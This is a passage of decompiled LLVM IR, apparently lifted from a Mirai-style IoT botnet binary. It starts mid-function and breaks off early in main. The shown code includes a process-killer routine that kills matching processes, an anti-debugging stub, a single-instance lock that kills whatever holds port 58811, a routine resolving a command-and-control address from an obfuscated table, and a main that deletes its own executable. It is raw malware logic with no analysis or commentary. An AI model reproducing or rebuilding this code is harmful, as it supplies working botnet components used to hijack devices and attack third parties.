  br i1 %v2_e96082, label %dec_label_pc_e8a4, label %dec_label_pc_e968.lr.ph

dec_label_pc_e968.lr.ph:                          ; preds = %.thread28
  %v0_e968.pre = load i32, i32* @sl, align 4
  %v1_e96c.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e968

dec_label_pc_e8a4:                                ; preds = %dec_label_pc_e960.backedge, %.thread28, %dec_label_pc_e888
  store i32 %v2_e3b4, i32* @r3, align 4
  %v3_e8a8 = load i32, i32* %stack_var_-52, align 4
  store i32 %v3_e8a8, i32* @r5, align 4
  %v5_e8b0 = icmp slt i32 %v0_e8f4107, %v3_e8a8
  br i1 %v5_e8b0, label %dec_label_pc_e8c0, label %.thread37

.thread37:                                        ; preds = %dec_label_pc_e8a4
  %v1_e99490 = add i32 %v0_e8f4107, -1
  store i32 %v1_e99490, i32* %r1.global-to-local, align 4
  %v2_e99491 = icmp eq i32 %v0_e8f4107, 0
  br i1 %v2_e99491, label %dec_label_pc_e8c0, label %dec_label_pc_e99c.lr.ph

dec_label_pc_e99c.lr.ph:                          ; preds = %.thread37
  %v0_e99c.pre = load i32, i32* @sb, align 4
  %v1_e9a0.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e99c

dec_label_pc_e8c0:                                ; preds = %dec_label_pc_e994.backedge, %.thread37, %dec_label_pc_e8a4
  %v3_e8c4 = load i32, i32* %stack_var_-56, align 4
  store i32 %v3_e8c4, i32* @r5, align 4
  %v5_e8cc = icmp slt i32 %v0_e8f4107, %v3_e8c4
  br i1 %v5_e8cc, label %dec_label_pc_e8dc, label %.thread46

.thread46:                                        ; preds = %dec_label_pc_e8c0
  %v1_e9c899 = add i32 %v0_e8f4107, -1
  store i32 %v1_e9c899, i32* %r1.global-to-local, align 4
  %v2_e9c8100 = icmp eq i32 %v0_e8f4107, 0
  br i1 %v2_e9c8100, label %dec_label_pc_e8dc, label %dec_label_pc_e9d0.lr.ph

dec_label_pc_e9d0.lr.ph:                          ; preds = %.thread46
  %v0_e9d0.pre = load i32, i32* @fp, align 4
  %v1_e9d4.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e9d0

dec_label_pc_e8dc:                                ; preds = %dec_label_pc_e9c8.backedge, %.thread46, %dec_label_pc_e8c0
  store i32 %v2_e3b4, i32* %r1.global-to-local, align 4
  %v3_e8e0 = load i32, i32* %stack_var_-60, align 4
  store i32 %v3_e8e0, i32* @lr, align 4
  %v5_e8e8 = icmp slt i32 %v0_e8f4107, %v3_e8e0
  br i1 %v5_e8e8, label %dec_label_pc_e854.backedge, label %.thread52

dec_label_pc_e854.backedge:                       ; preds = %dec_label_pc_e914, %.thread52, %dec_label_pc_e8dc
  store i32 %v2_e850, i32* @r1, align 4
  store i32 4096, i32* @r2, align 4
  %v1_e860 = call i32 @__libc_read(i32 %v2_e7b4)
  %tmp226 = icmp slt i32 %v1_e860, 1
  br i1 %tmp226, label %dec_label_pc_ea68, label %dec_label_pc_e86c

.thread52:                                        ; preds = %dec_label_pc_e8dc
  store i32 0, i32* %r1.global-to-local, align 4
  %v2_e8f4109 = icmp eq i32 %v0_e8f4107, 0
  br i1 %v2_e8f4109, label %dec_label_pc_e854.backedge, label %dec_label_pc_e8fc.lr.ph

dec_label_pc_e8fc.lr.ph:                          ; preds = %.thread52
  %v1_e904.pre = load i32, i32* @r4, align 4
  br label %dec_label_pc_e8fc

dec_label_pc_e8fc:                                ; preds = %dec_label_pc_e914, %dec_label_pc_e8fc.lr.ph
  %v0_e8f4.in = phi i32 [ %v0_e8f4107, %dec_label_pc_e8fc.lr.ph ], [ %v0_e8f4, %dec_label_pc_e914 ]
  %v0_e914 = phi i32 [ 0, %dec_label_pc_e8fc.lr.ph ], [ %v1_e914, %dec_label_pc_e914 ]
  %v1_e900 = phi i32 [ 0, %dec_label_pc_e8fc.lr.ph ], [ %v1_e900174, %dec_label_pc_e914 ]
  %v0_e8f4 = add i32 %v0_e8f4.in, -1
  store i32 %v3_e844, i32* %r3.global-to-local, align 4
  %v2_e900 = add i32 %v1_e900, %v3_e844
  %v3_e900 = inttoptr i32 %v2_e900 to i8*
  %v4_e900 = load i8, i8* %v3_e900, align 1
  %v6_e900 = zext i8 %v4_e900 to i32
  store i32 %v6_e900, i32* %r2.global-to-local, align 4
  %v2_e904 = add i32 %v0_e914, %v1_e904.pre
  %v3_e904 = inttoptr i32 %v2_e904 to i8*
  %v4_e904 = load i8, i8* %v3_e904, align 1
  %v6_e904 = zext i8 %v4_e904 to i32
  store i32 %v6_e904, i32* @r3, align 4
  %v9_e908 = icmp eq i8 %v4_e904, %v4_e900
  br i1 %v9_e908, label %dec_label_pc_e9ec, label %bb227

bb227:                                            ; preds = %dec_label_pc_e8fc
  br label %dec_label_pc_e914

dec_label_pc_e914:                                ; preds = %bb227, %dec_label_pc_e9ec
  %v1_e900174 = phi i32 [ %v1_e9ec, %dec_label_pc_e9ec ], [ 0, %bb227 ]
  %v1_e914 = add i32 %v0_e914, 1
  store i32 %v1_e914, i32* %r1.global-to-local, align 4
  %v2_e8f4 = icmp eq i32 %v0_e8f4, 0
  br i1 %v2_e8f4, label %dec_label_pc_e854.backedge, label %dec_label_pc_e8fc

dec_label_pc_e91c:                                ; preds = %dec_label_pc_e934
  %v1_e91c = add i32 %v1_e934, 1
  store i32 %v1_e91c, i32* @lr, align 4
  %v9_e920 = icmp eq i32 %v3_e870, %v1_e91c
  br i1 %v9_e920, label %dec_label_pc_e9f8, label %dec_label_pc_e92c.backedge

dec_label_pc_e92c.backedge:                       ; preds = %dec_label_pc_e91c, %dec_label_pc_e948
  %v1_e934139 = phi i32 [ 0, %dec_label_pc_e948 ], [ %v1_e91c, %dec_label_pc_e91c ]
  %storemerge127 = add i32 %storemerge127.in, 1
  %v1_e92c = add i32 %v0_e92c, -1
  store i32 %v1_e92c, i32* %r1.global-to-local, align 4
  %v2_e92c = icmp eq i32 %v0_e92c, 0
  br i1 %v2_e92c, label %dec_label_pc_e888, label %dec_label_pc_e934

dec_label_pc_e934:                                ; preds = %dec_label_pc_e92c.backedge, %dec_label_pc_e934.lr.ph
  %v0_e92c = phi i32 [ %v1_e92c72, %dec_label_pc_e934.lr.ph ], [ %v1_e92c, %dec_label_pc_e92c.backedge ]
  %storemerge127.in = phi i32 [ 0, %dec_label_pc_e934.lr.ph ], [ %storemerge127, %dec_label_pc_e92c.backedge ]
  %v1_e934 = phi i32 [ 0, %dec_label_pc_e934.lr.ph ], [ %v1_e934139, %dec_label_pc_e92c.backedge ]
  %v2_e934 = add i32 %v1_e934, %v0_e934.pre
  %v3_e934 = inttoptr i32 %v2_e934 to i8*
  %v4_e934 = load i8, i8* %v3_e934, align 1
  %v6_e934 = zext i8 %v4_e934 to i32
  store i32 %v6_e934, i32* %r2.global-to-local, align 4
  %v2_e938 = add i32 %storemerge127.in, %v1_e938.pre
  %v3_e938 = inttoptr i32 %v2_e938 to i8*
  %v4_e938 = load i8, i8* %v3_e938, align 1
  %v6_e938 = zext i8 %v4_e938 to i32
  store i32 %v6_e938, i32* %r3.global-to-local, align 4
  %v9_e93c = icmp eq i8 %v4_e938, %v4_e934
  br i1 %v9_e93c, label %dec_label_pc_e91c, label %dec_label_pc_e948

dec_label_pc_e948:                                ; preds = %dec_label_pc_e934
  br label %dec_label_pc_e92c.backedge

dec_label_pc_e950:                                ; preds = %dec_label_pc_e968
  %v1_e950 = add i32 %v1_e968, 1
  store i32 %v1_e950, i32* @lr, align 4
  %v9_e954 = icmp eq i32 %v3_e88c, %v1_e950
  br i1 %v9_e954, label %dec_label_pc_e9f8, label %dec_label_pc_e960.backedge

dec_label_pc_e960.backedge:                       ; preds = %dec_label_pc_e950, %dec_label_pc_e97c
  %v1_e968148 = phi i32 [ 0, %dec_label_pc_e97c ], [ %v1_e950, %dec_label_pc_e950 ]
  %storemerge126 = add i32 %storemerge126.in, 1
  %v1_e960 = add i32 %v0_e960, -1
  store i32 %v1_e960, i32* %r1.global-to-local, align 4
  %v2_e960 = icmp eq i32 %v0_e960, 0
  br i1 %v2_e960, label %dec_label_pc_e8a4, label %dec_label_pc_e968

dec_label_pc_e968:                                ; preds = %dec_label_pc_e960.backedge, %dec_label_pc_e968.lr.ph
  %v0_e960 = phi i32 [ %v1_e96081, %dec_label_pc_e968.lr.ph ], [ %v1_e960, %dec_label_pc_e960.backedge ]
  %storemerge126.in = phi i32 [ 0, %dec_label_pc_e968.lr.ph ], [ %storemerge126, %dec_label_pc_e960.backedge ]
  %v1_e968 = phi i32 [ 0, %dec_label_pc_e968.lr.ph ], [ %v1_e968148, %dec_label_pc_e960.backedge ]
  %v2_e968 = add i32 %v1_e968, %v0_e968.pre
  %v3_e968 = inttoptr i32 %v2_e968 to i8*
  %v4_e968 = load i8, i8* %v3_e968, align 1
  %v6_e968 = zext i8 %v4_e968 to i32
  store i32 %v6_e968, i32* %r2.global-to-local, align 4
  %v2_e96c = add i32 %storemerge126.in, %v1_e96c.pre
  %v3_e96c = inttoptr i32 %v2_e96c to i8*
  %v4_e96c = load i8, i8* %v3_e96c, align 1
  %v6_e96c = zext i8 %v4_e96c to i32
  store i32 %v6_e96c, i32* %r3.global-to-local, align 4
  %v9_e970 = icmp eq i8 %v4_e96c, %v4_e968
  br i1 %v9_e970, label %dec_label_pc_e950, label %dec_label_pc_e97c

dec_label_pc_e97c:                                ; preds = %dec_label_pc_e968
  br label %dec_label_pc_e960.backedge

dec_label_pc_e984:                                ; preds = %dec_label_pc_e99c
  %v1_e984 = add i32 %v1_e99c, 1
  store i32 %v1_e984, i32* @lr, align 4
  %v9_e988 = icmp eq i32 %v3_e8a8, %v1_e984
  br i1 %v9_e988, label %dec_label_pc_e9f8, label %dec_label_pc_e994.backedge

dec_label_pc_e994.backedge:                       ; preds = %dec_label_pc_e984, %dec_label_pc_e9b0
  %v1_e99c157 = phi i32 [ 0, %dec_label_pc_e9b0 ], [ %v1_e984, %dec_label_pc_e984 ]
  %storemerge125 = add i32 %storemerge125.in, 1
  %v1_e994 = add i32 %v0_e994, -1
  store i32 %v1_e994, i32* %r1.global-to-local, align 4
  %v2_e994 = icmp eq i32 %v0_e994, 0
  br i1 %v2_e994, label %dec_label_pc_e8c0, label %dec_label_pc_e99c

dec_label_pc_e99c:                                ; preds = %dec_label_pc_e994.backedge, %dec_label_pc_e99c.lr.ph
  %v0_e994 = phi i32 [ %v1_e99490, %dec_label_pc_e99c.lr.ph ], [ %v1_e994, %dec_label_pc_e994.backedge ]
  %storemerge125.in = phi i32 [ 0, %dec_label_pc_e99c.lr.ph ], [ %storemerge125, %dec_label_pc_e994.backedge ]
  %v1_e99c = phi i32 [ 0, %dec_label_pc_e99c.lr.ph ], [ %v1_e99c157, %dec_label_pc_e994.backedge ]
  %v2_e99c = add i32 %v1_e99c, %v0_e99c.pre
  %v3_e99c = inttoptr i32 %v2_e99c to i8*
  %v4_e99c = load i8, i8* %v3_e99c, align 1
  %v6_e99c = zext i8 %v4_e99c to i32
  store i32 %v6_e99c, i32* %r2.global-to-local, align 4
  %v2_e9a0 = add i32 %storemerge125.in, %v1_e9a0.pre
  %v3_e9a0 = inttoptr i32 %v2_e9a0 to i8*
  %v4_e9a0 = load i8, i8* %v3_e9a0, align 1
  %v6_e9a0 = zext i8 %v4_e9a0 to i32
  store i32 %v6_e9a0, i32* @r3, align 4
  %v9_e9a4 = icmp eq i8 %v4_e9a0, %v4_e99c
  br i1 %v9_e9a4, label %dec_label_pc_e984, label %dec_label_pc_e9b0

dec_label_pc_e9b0:                                ; preds = %dec_label_pc_e99c
  br label %dec_label_pc_e994.backedge

dec_label_pc_e9b8:                                ; preds = %dec_label_pc_e9d0
  %v1_e9b8 = add i32 %v1_e9d0, 1
  store i32 %v1_e9b8, i32* @lr, align 4
  %v9_e9bc = icmp eq i32 %v3_e8c4, %v1_e9b8
  br i1 %v9_e9bc, label %dec_label_pc_e9f8, label %dec_label_pc_e9c8.backedge

dec_label_pc_e9c8.backedge:                       ; preds = %dec_label_pc_e9b8, %dec_label_pc_e9e4
  %v1_e9d0166 = phi i32 [ 0, %dec_label_pc_e9e4 ], [ %v1_e9b8, %dec_label_pc_e9b8 ]
  %storemerge = add i32 %storemerge.in, 1
  %v1_e9c8 = add i32 %v0_e9c8, -1
  store i32 %v1_e9c8, i32* %r1.global-to-local, align 4
  %v2_e9c8 = icmp eq i32 %v0_e9c8, 0
  br i1 %v2_e9c8, label %dec_label_pc_e8dc, label %dec_label_pc_e9d0

dec_label_pc_e9d0:                                ; preds = %dec_label_pc_e9c8.backedge, %dec_label_pc_e9d0.lr.ph
  %v0_e9c8 = phi i32 [ %v1_e9c899, %dec_label_pc_e9d0.lr.ph ], [ %v1_e9c8, %dec_label_pc_e9c8.backedge ]
  %storemerge.in = phi i32 [ 0, %dec_label_pc_e9d0.lr.ph ], [ %storemerge, %dec_label_pc_e9c8.backedge ]
  %v1_e9d0 = phi i32 [ 0, %dec_label_pc_e9d0.lr.ph ], [ %v1_e9d0166, %dec_label_pc_e9c8.backedge ]
  %v2_e9d0 = add i32 %v1_e9d0, %v0_e9d0.pre
  %v3_e9d0 = inttoptr i32 %v2_e9d0 to i8*
  %v4_e9d0 = load i8, i8* %v3_e9d0, align 1
  %v6_e9d0 = zext i8 %v4_e9d0 to i32
  store i32 %v6_e9d0, i32* %r2.global-to-local, align 4
  %v2_e9d4 = add i32 %storemerge.in, %v1_e9d4.pre
  %v3_e9d4 = inttoptr i32 %v2_e9d4 to i8*
  %v4_e9d4 = load i8, i8* %v3_e9d4, align 1
  %v6_e9d4 = zext i8 %v4_e9d4 to i32
  store i32 %v6_e9d4, i32* @r3, align 4
  %v9_e9d8 = icmp eq i8 %v4_e9d4, %v4_e9d0
  br i1 %v9_e9d8, label %dec_label_pc_e9b8, label %dec_label_pc_e9e4

dec_label_pc_e9e4:                                ; preds = %dec_label_pc_e9d0
  br label %dec_label_pc_e9c8.backedge

dec_label_pc_e9ec:                                ; preds = %dec_label_pc_e8fc
  %v1_e9ec = add i32 %v1_e900, 1
  %v9_e9f0 = icmp eq i32 %v3_e8e0, %v1_e9ec
  br i1 %v9_e9f0, label %dec_label_pc_e9f8, label %dec_label_pc_e914

dec_label_pc_e9f8:                                ; preds = %dec_label_pc_e91c, %dec_label_pc_e950, %dec_label_pc_e984, %dec_label_pc_e9b8, %dec_label_pc_e9ec
  %v1_e9fc = call i32 @table_lock_val(i32 12)
  %v1_ea04 = call i32 @table_lock_val(i32 13)
  %v1_ea0c = call i32 @table_lock_val(i32 14)
  %v1_ea14 = call i32 @table_lock_val(i32 15)
  %v1_ea1c = call i32 @table_lock_val(i32 16)
  %v1_ea24 = call i32 @__GI___libc_close(i32 %v2_e7b4)
  %v0_ea28 = load i32, i32* @r7, align 4
  store i32 9, i32* %r1.global-to-local, align 4
  %v2_ea30 = call i32 @kill(i32 %v0_ea28, i32 9)
  br label %dec_label_pc_ea34

dec_label_pc_ea34:                                ; preds = %dec_label_pc_e7a8, %dec_label_pc_ea68, %dec_label_pc_e9f8
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_ea40 = call i32 @util_zero(i32 %v2_e630, i32 64)
  store i32 64, i32* %r1.global-to-local, align 4
  %v2_ea50 = call i32 @util_zero(i32 %v2_e680, i32 64)
  %v1_ea58 = call i32 @sleep(i32 1)
  store i32 %v2_e604, i32* @r4, align 4
  %v0_ea60 = load i32, i32* @r7, align 4
  store i32 %v0_ea60, i32* @r5, align 4
  br label %dec_label_pc_e554.backedge

dec_label_pc_ea68:                                ; preds = %dec_label_pc_e854.backedge, %dec_label_pc_e7c4
  %v1_ea6c = call i32 @table_lock_val(i32 12)
  %v1_ea74 = call i32 @table_lock_val(i32 13)
  %v1_ea7c = call i32 @table_lock_val(i32 14)
  %v1_ea84 = call i32 @table_lock_val(i32 15)
  %v1_ea8c = call i32 @table_lock_val(i32 16)
  %v1_ea94 = call i32 @__GI___libc_close(i32 %v2_e7b4)
  br label %dec_label_pc_ea34

; uselistorder directives
  uselistorder i32 %v1_e9ec, { 1, 0 }
  uselistorder i32 %v1_e914, { 1, 0 }
  uselistorder i32 %v1_e900, { 1, 0 }
  uselistorder i32 %v0_e914, { 1, 0 }
  uselistorder i32 %v1_e860, { 1, 0 }
  uselistorder i32 %v2_e7b4, { 3, 2, 4, 1, 0 }
  uselistorder i1 %v7_e78c, { 1, 0 }
  uselistorder i32 %v2_e788, { 1, 0 }
  uselistorder i32 %v2_e558, { 1, 0 }
  uselistorder i32 %stack_var_-8428.1.be, { 1, 0 }
  uselistorder i32 %v3_e6e0, { 1, 2, 0 }
  uselistorder i32 %v2_e5e8, { 1, 0 }
  uselistorder i32 %v1_e588, { 0, 1, 5, 4, 3, 2, 6, 8, 9, 7 }
  uselistorder i32 %v1_e564, { 2, 1, 0, 3 }
  uselistorder i32 %stack_var_-8428.0, { 1, 0 }
  uselistorder i32 %v2_e850, { 1, 0, 2 }
  uselistorder i32 %v2_e680, { 1, 0, 2, 3 }
  uselistorder i32 %v2_e630, { 1, 2, 3, 0, 4 }
  uselistorder i32 %v2_e518, { 1, 0 }
  uselistorder i32 %v3_e4fc, { 1, 0 }
  uselistorder i32 %v2_e4c8, { 2, 0, 1 }
  uselistorder i32 %v3_e474, { 1, 0 }
  uselistorder i32 %v1_e464, { 3, 2, 0, 4, 6, 5, 7, 8, 9, 1, 10, 11, 12 }
  uselistorder i32 %v3_e3e4, { 1, 2, 0 }
  uselistorder i32 %storemerge184, { 1, 0 }
  uselistorder i32 %v0_e378, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-76, { 1, 0 }
  uselistorder i32* %stack_var_-56, { 1, 0, 2 }
  uselistorder i32* %stack_var_-44, { 1, 0, 2 }
  uselistorder i32* %stack_var_-48, { 1, 0, 2 }
  uselistorder i32* %stack_var_-52, { 1, 0, 2 }
  uselistorder i32* %stack_var_-60, { 1, 0, 2 }
  uselistorder i32* %r1.global-to-local, { 5, 6, 7, 8, 9, 10, 12, 11, 0, 13, 4, 3, 2, 1, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 29, 28, 30, 31, 32, 34, 33, 35, 36, 37, 38, 39, 40, 41, 42, 43, 45, 44, 46, 47, 48, 49, 50, 51, 52, 53 }
  uselistorder i32 (i8*, i32, i32)* @util_stristr, { 0, 1, 3, 2, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22 }
  uselistorder i32 (i32*)* @__GI_readdir, { 4, 3, 0, 5, 6, 7, 2, 8, 1 }
  uselistorder i32 (i32)* @__GI_opendir, { 2, 1, 0 }
  uselistorder i32 (i32, i32, i32)* @readlink, { 3, 2, 1, 0 }
  uselistorder i32 4095, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_26e54.120, { 1, 0, 2, 3 }
  uselistorder i32* @global_var_26e58.112, { 0, 2, 1 }
  uselistorder label %dec_label_pc_ea34, { 1, 2, 0 }
  uselistorder label %dec_label_pc_e9f8, { 4, 3, 2, 1, 0 }
  uselistorder label %dec_label_pc_e9c8.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e994.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e960.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e92c.backedge, { 1, 0 }
  uselistorder label %dec_label_pc_e914, { 1, 0 }
  uselistorder label %dec_label_pc_e86c, { 1, 0 }
  uselistorder label %dec_label_pc_e7a8, { 1, 0 }
  uselistorder label %.thread12, { 1, 0 }
  uselistorder label %dec_label_pc_e554.backedge, { 4, 3, 0, 1, 5, 2 }
  uselistorder label %dec_label_pc_e73c, { 1, 0 }
  uselistorder label %dec_label_pc_e564, { 1, 0 }
  uselistorder label %dec_label_pc_e564.preheader, { 1, 0 }
  uselistorder label %.thread9, { 1, 0 }
  uselistorder label %dec_label_pc_e410, { 1, 0 }
}

define i32 @anti_gdb_entry(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  store i32 ptrtoint (i32* @global_var_ec28.124 to i32), i32* @global_var_241a8.126, align 4
  ret i32 %arg1
}

define i32 @ensure_single_instance(i32 %arg1) local_unnamed_addr {
entry:
  %stack_var_-44 = alloca i32, align 4
  %stack_var_-28 = alloca i32, align 4
  %v6_eac4 = load i32, i32* @r5, align 4
  %v9_eac4 = load i32, i32* @r6, align 4
  %v12_eac4 = load i32, i32* @r7, align 4
  %v15_eac4 = load i32, i32* @r8, align 4
  store i32 1, i32* @r4, align 4
  store i32 1, i32* %stack_var_-28, align 4
  %v3_eae0 = call i32 @socket(i32 2, i32 1, i32 0)
  store i32 ptrtoint (i32* @global_var_241a0.128 to i32), i32* @r6, align 4
  %v7_eae8 = icmp eq i32 %v3_eae0, -1
  store i32 %v3_eae0, i32* @global_var_241a0.128, align 4
  br i1 %v7_eae8, label %dec_label_pc_eba0, label %dec_label_pc_eaf4

dec_label_pc_eaf4:                                ; preds = %entry
  %v2_eaf4 = ptrtoint i32* %stack_var_-28 to i32
  store i32 %v2_eaf4, i32* @r3, align 4
  %v0_eaf8 = load i32, i32* @r4, align 4
  store i32 4, i32* @r5, align 4
  %v5_eb08 = call i32 @__GI_setsockopt(i32 %v3_eae0, i32 %v0_eaf8, i32 2, i32 %v2_eaf4, i32 4)
  %v2_eb0c = load i32, i32* @global_var_241a0.128, align 4
  store i32 %v2_eb0c, i32* @r4, align 4
  store i32 0, i32* @r2, align 4
  %v2_eb1c = call i32 @__libc_fcntl(i32 %v2_eb0c, i32 3)
  %v0_eb20 = load i32, i32* @r5, align 4
  %v1_eb24 = or i32 %v2_eb1c, 2048
  store i32 %v1_eb24, i32* @r2, align 4
  %v0_eb28 = load i32, i32* @r4, align 4
  %v2_eb2c = call i32 @__libc_fcntl(i32 %v0_eb28, i32 %v0_eb20)
  store i32 ptrtoint (i8** @global_var_241ac.130 to i32), i32* @r8, align 4
  %v2_eb34 = load i8, i8* bitcast (i8** @global_var_241ac.130 to i8*), align 4
  %v2_eb38 = icmp eq i8 %v2_eb34, 0
  br i1 %v2_eb38, label %.thread2, label %bb

.thread2:                                         ; preds = %dec_label_pc_eaf4
  br label %bb20

bb:                                               ; preds = %dec_label_pc_eaf4
  br label %bb20

bb20:                                             ; preds = %.thread2, %bb
  %v0_eb5c = call i32 @__GI___errno_location()
  store i32 0, i32* @r7, align 4
  %v2_eb64 = inttoptr i32 %v0_eb5c to i32*
  store i32 0, i32* %v2_eb64, align 4
  %v2_eb68 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_eb68, i32* @r5, align 4
  store i32 %v0_eb5c, i32* @r4, align 4
  %v2_eb78 = load i32, i32* @global_var_241a0.128, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_eb84 = call i32 @bind(i32 %v2_eb78, i32 %v2_eb68, i32 16)
  %v7_eb88 = icmp eq i32 %v3_eb84, -1
  br i1 %v7_eb88, label %dec_label_pc_ebac, label %dec_label_pc_eb90

dec_label_pc_eb90:                                ; preds = %bb20
  %v2_eb98 = load i32, i32* @global_var_241a0.128, align 4
  %v2_eb9c = call i32 @listen(i32 %v2_eb98, i32 1)
  br label %dec_label_pc_eba0

dec_label_pc_eba0:                                ; preds = %entry, %dec_label_pc_ebb8, %dec_label_pc_eb90
  %v1_eba8 = phi i32 [ %v3_eae0, %entry ], [ %v1_ec00, %dec_label_pc_ebb8 ], [ %v2_eb9c, %dec_label_pc_eb90 ]
  store i32 %v6_eac4, i32* @r5, align 4
  store i32 %v9_eac4, i32* @r6, align 4
  store i32 %v12_eac4, i32* @r7, align 4
  store i32 %v15_eac4, i32* @r8, align 4
  ret i32 %v1_eba8

dec_label_pc_ebac:                                ; preds = %bb20
  %v0_ebac = load i32, i32* @r4, align 4
  %v1_ebac = inttoptr i32 %v0_ebac to i32*
  %v2_ebac = load i32, i32* %v1_ebac, align 4
  %v7_ebb0 = icmp eq i32 %v2_ebac, 99
  br i1 %v7_ebb0, label %dec_label_pc_ec08, label %dec_label_pc_ebb8

dec_label_pc_ebb8:                                ; preds = %dec_label_pc_ec08, %bb21, %dec_label_pc_ebac
  %v2_ebd0 = load i32, i32* @global_var_241a0.128, align 4
  store i32 2, i32* %stack_var_-44, align 4
  %v3_ebe0 = call i32 @__libc_connect(i32 %v2_ebd0, i32 %v2_eb68, i32 16)
  %v1_ebe8 = call i32 @sleep(i32 5)
  %v2_ebec = load i32, i32* @global_var_241a0.128, align 4
  %v1_ebf0 = call i32 @__GI___libc_close(i32 %v2_ebec)
  %v1_ebfc = call i32 @killer_kill_by_port(i32 58811)
  %v1_ec00 = call i32 @ensure_single_instance(i32 %v1_ebfc)
  br label %dec_label_pc_eba0

dec_label_pc_ec08:                                ; preds = %dec_label_pc_ebac
  %v2_ec08 = load i8, i8* bitcast (i8** @global_var_241ac.130 to i8*), align 4
  %v3_ec08 = zext i8 %v2_ec08 to i32
  %v1_ec0c = load i32, i32* @r7, align 4
  %v9_ec0c = icmp eq i32 %v3_ec08, %v1_ec0c
  br i1 %v9_ec0c, label %dec_label_pc_ebb8, label %bb21

bb21:                                             ; preds = %dec_label_pc_ec08
  %v2_ec14 = trunc i32 %v1_ec0c to i8
  store i8 %v2_ec14, i8* bitcast (i8** @global_var_241ac.130 to i8*), align 4
  br label %dec_label_pc_ebb8

; uselistorder directives
  uselistorder i32 %v2_eb68, { 1, 0, 2 }
  uselistorder i32 %v3_eae0, { 1, 2, 3, 0 }
  uselistorder i32* %stack_var_-28, { 1, 0 }
  uselistorder i32 (i32)* @killer_kill_by_port, { 1, 0 }
  uselistorder i32 (i32, i32)* @listen, { 1, 0 }
  uselistorder i32 (i32, i32, i32)* @bind, { 2, 1, 0 }
  uselistorder i8* bitcast (i8** @global_var_241ac.130 to i8*), { 0, 2, 1 }
  uselistorder i8** @global_var_241ac.130, { 1, 0 }
  uselistorder label %dec_label_pc_ebb8, { 1, 0, 2 }
  uselistorder label %dec_label_pc_eba0, { 1, 2, 0 }
  uselistorder label %bb20, { 1, 0 }
}

define i32 @resolve_cnc_addr(i32 %arg1) local_unnamed_addr {
entry:
  %v1_ec30 = call i32 @table_unlock_val(i32 3)
  %v3_ec3c = call i32 @table_retrieve_val(i32 3, i32* null)
  %v1_ec40 = call i32 @resolv_lookup(i32 %v3_ec3c)
  store i32 %v1_ec40, i32* @r6, align 4
  %v1_ec4c = call i32 @table_lock_val(i32 3)
  %v0_ec50 = load i32, i32* @r6, align 4
  %v2_ec50 = icmp eq i32 %v0_ec50, 0
  br i1 %v2_ec50, label %dec_label_pc_eca0, label %dec_label_pc_ec58

dec_label_pc_ec58:                                ; preds = %entry
  %v1_ec58 = add i32 %v0_ec50, 4
  %v2_ec58 = inttoptr i32 %v1_ec58 to i32*
  %v3_ec58 = load i32, i32* %v2_ec58, align 4
  store i32 %v3_ec58, i32* @r4, align 4
  %v0_ec5c = call i32 @rand_next()
  %v0_ec60 = load i32, i32* @r6, align 4
  %v1_ec60 = inttoptr i32 %v0_ec60 to i8*
  %v2_ec60 = load i8, i8* %v1_ec60, align 1
  %v3_ec60 = zext i8 %v2_ec60 to i32
  %v3_ec64 = urem i32 %v0_ec5c, %v3_ec60
  store i32 ptrtoint (i16** @global_var_26e5c.133 to i32), i32* @r5, align 4
  %v0_ec6c = load i32, i32* @r4, align 4
  %v4_ec6c = mul nuw nsw i32 %v3_ec64, 4
  %v5_ec6c = add i32 %v0_ec6c, %v4_ec6c
  %v6_ec6c = inttoptr i32 %v5_ec6c to i32*
  %v7_ec6c = load i32, i32* %v6_ec6c, align 4
  store i32 %v7_ec6c, i32* @global_var_26e60.134, align 4
  %v1_ec78 = call i32 @resolv_entries_free(i32 %v0_ec60)
  %v1_ec80 = call i32 @table_unlock_val(i32 4)
  %v3_ec8c = call i32 @table_retrieve_val(i32 4, i32* null)
  %v4_ec8c = inttoptr i32 %v3_ec8c to i16*
  %v3_ec90 = load i16, i16* %v4_ec8c, align 2
  store i16 %v3_ec90, i16* bitcast (i32* @global_var_26e5e.135 to i16*), align 4
  %v1_ec9c = call i32 @table_lock_val(i32 4)
  br label %dec_label_pc_eca0

dec_label_pc_eca0:                                ; preds = %entry, %dec_label_pc_ec58
  %v1_eca4 = phi i32 [ %v1_ec4c, %entry ], [ %v1_ec9c, %dec_label_pc_ec58 ]
  ret i32 %v1_eca4

; uselistorder directives
  uselistorder label %dec_label_pc_eca0, { 1, 0 }
}

define i32 @main(i32 %argc, i8** %argv) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %r2.global-to-local = alloca i32, align 4
  %r3.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8** %argv to i32
  %stack_var_-1432 = alloca i32, align 4
  %stack_var_-88 = alloca i32, align 4
  %stack_var_-42 = alloca i16, align 2
  %stack_var_-168 = alloca i32, align 4
  %stack_var_-408 = alloca i32, align 4
  %stack_var_-280 = alloca i32, align 4
  %stack_var_-48 = alloca i32, align 4
  %stack_var_-40 = alloca i32, align 4
  %stack_var_-120 = alloca i32, align 4
  %stack_var_-152 = alloca i32, align 4
  %stack_var_-52 = alloca i32, align 4
  %stack_var_-56 = alloca i32, align 4
  %stack_var_-64 = alloca i32, align 4
  %stack_var_-72 = alloca i32, align 4
  %v2_ecbc = ptrtoint i32* %stack_var_-64 to i32
  store i32 %v2_ecbc, i32* @r4, align 4
  store i32 %argc, i32* @r5, align 4
  %tmp49 = bitcast i8** %argv to i32*
  %v3_ecc4 = load i32, i32* %tmp49, align 4
  store i32 %tmp, i32* @r6, align 4
  %v1_eccc = call i32 @unlink(i32 %v3_ecc4)
  %v2_ecd4 = call i32 @sigemptyset(i32* nonnull %stack_var_-64)
  store i32 %v2_ecbc, i32* @r0, align 4
